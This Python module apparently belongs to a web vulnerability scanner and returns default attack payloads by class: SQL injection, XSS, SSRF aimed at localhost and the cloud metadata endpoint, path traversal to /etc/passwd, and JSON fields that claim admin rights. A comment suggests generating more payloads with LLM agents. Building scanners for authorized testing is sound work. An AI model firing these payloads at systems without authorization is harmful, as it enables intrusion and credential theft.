# ml/ai_payloads.py
from typing import Dict, List, Any

def generate_ai_payloads(endpoint_ctx: Dict[str, Any]) -> Dict[str, List[str]]:
    """
    Return strategy-driven payloads per class. Here we provide strong defaults.
    If you wire your LLM/agents, generate dynamically based on endpoint_ctx.
    """
    url = (endpoint_ctx.get("url") or "").lower()
    guess_json = any(x in url for x in ("/api/", "/v1/", "/v2/"))
    return {
        "sqli": [
            "' OR '1'='1 --", "') OR ('1'='1", "\" OR \"1\"=\"1", "admin' --",
            "' UNION SELECT NULL,NULL --"
        ],
        "xss": [
            "<svg/onload=alert(1)>",
            '"><img src=x onerror=alert(1)>',
            "<script>alert(1)</script>"
        ],
        "ssrf": [
            "http://127.0.0.1:80",
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/hosts"
        ],
        "path_traversal": [
            "../etc/passwd", "..\\..\\windows\\win.ini", "../../app.py"
        ],
        "json_abuse": ([
            '{"role":"admin"}', '{"isAdmin":true}', '{"debug":true}'
        ] if guess_json else [])
    }

